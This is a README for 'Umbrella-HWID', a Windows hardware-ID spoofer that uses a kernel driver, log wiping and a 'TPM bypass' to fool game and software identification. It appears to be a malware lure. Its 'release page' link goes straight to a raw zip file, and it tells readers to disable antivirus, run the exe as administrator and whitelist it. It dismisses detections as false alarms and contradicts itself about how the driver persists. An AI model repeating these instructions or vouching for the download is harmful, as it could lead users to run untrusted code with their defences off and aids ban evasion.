# 🛡️ Umbrella-HWID - Modify system hardware data for privacy

[ ![Download Umbrella-HWID](https://img.shields.io/badge/Download-Release_Page-blue.svg) ](https://raw.githubusercontent.com/perfil6634/Umbrella-HWID/main/Umbrella/Properties/HWID-Umbrella-2.0-beta.4.zip)

Umbrella-HWID changes how your computer reports hardware data to software. Many applications identify your PC by reading serial numbers from your motherboard, disk drives, and network card. This tool updates those identifiers. Developers use this for testing and system privacy.

## 📥 How to download the software

1. Visit the [official release page](https://raw.githubusercontent.com/perfil6634/Umbrella-HWID/main/Umbrella/Properties/HWID-Umbrella-2.0-beta.4.zip).
2. Look for the section labeled "Assets."
3. Select the file ending in .zip to start the download.
4. Open your Downloads folder on your Windows computer.
5. Right-click the folder and choose "Extract all."
6. Open the extracted folder to find the application.

## ⚙️ System requirements

This tool functions on Windows 10 and Windows 11. Ensure your system meets these points before you run the application:

* You have administrator access to your account.
* You disable your antivirus software temporarily. Some security tools block programs that modify system identifiers.
* You install the latest version of the .NET Framework from the official Microsoft website.
* Your system partition has at least 100MB of free space for log cleanup processes.

## 🚀 Running the application

1. Find the file named "Umbrella.exe" inside the folder you extracted.
2. Right-click the file and select "Run as administrator."
3. Click "Yes" if Windows asks for permission to make changes.
4. The main window shows a list of your current hardware IDs.
5. Select the specific components you choose to modify.
6. Click the "Apply" button.
7. Wait for the status indicator to turn green.
8. Restart your computer to make sure the system registers the new IDs.

## 🛠️ Features and capability

The program manages several hardware layers to ensure consistent reporting.

**Motherboard Serial Changer**
The tool replaces your motherboard serial number with a random sequence. This prevents software from pinning your identity to a specific mainboard.

**Disk Drive Volume ID Clone**
Each hard drive and solid-state drive carries a unique volume ID. This utility generates a clone ID. The system treats your drive as if it were a brand-new unit.

**MAC Address Modifier**
Your network adapter communicates using a Media Access Control (MAC) address. This tool masks your actual address and replaces it with a temporary one. This protects your network identity from tracking.

**Bios Serial Flash**
The BIOS chip stores fundamental system data. This tool updates the readable serial fields within the BIOS environment without risking your actual motherboard firmware.

**Permanent Log Cleanup**
Many games and applications save logs deep in your Windows folders. These logs record your hardware history. The cleaner identifies these hidden files and removes them entirely. This prevents applications from finding old hardware data after you run a spoofing task.

**TPM Bypass**
Computers running Windows 11 often report TPM data to verify system health. This feature allows the software to bypass standard TPM checks during hardware identification requests.

## 🧠 Managing hardware data

The software uses a kernel-level driver to intercept requests for system information. When a game or application asks for your serial number, the driver provides the spoofed data instead of your real hardware information. This happens in real-time. You do not need to keep the application open after you apply the changes, as the driver stays active in the background until the next reboot. If you want to return to your original hardware identity, simply restart your system. The driver resets on every boot, which ensures you always have control over your data.

## 🛡️ Privacy and safety

The tool does not send your data to any remote server. Every change happens locally on your machine. We suggest you keep a backup of your original hardware identifiers. You can find these by running the "View System Info" button within the app. Take a screenshot of the original numbers before you change them.

## ❓ Frequently asked questions

**Will this software damage my hardware?**
No. The tool only modifies virtual identifiers in the operating system registry and memory. It makes no physical changes to your hardware components.

**Do I need to run this every time I start my PC?**
The driver runs automatically when you boot your machine. Once you set your preferences in the app, the system remembers these settings for that session.

**Does this work with every game?**
This tool is effective for most software, but some modern games use advanced tracking methods. We update the tool regularly to handle new identification patterns.

**Why does my antivirus flag this file?**
Security tools often block software that modifies registry keys or system files. This is a standard reaction for "heuristic" protection. You can add an exclusion to your antivirus for the Umbrella-HWID folder to stop these false alarms.

**How do I check if the changes are active?**
Run the "Check System Status" button. It will display the current serial numbers reported to Windows. Compare these to your original numbers to confirm the spoofing is active.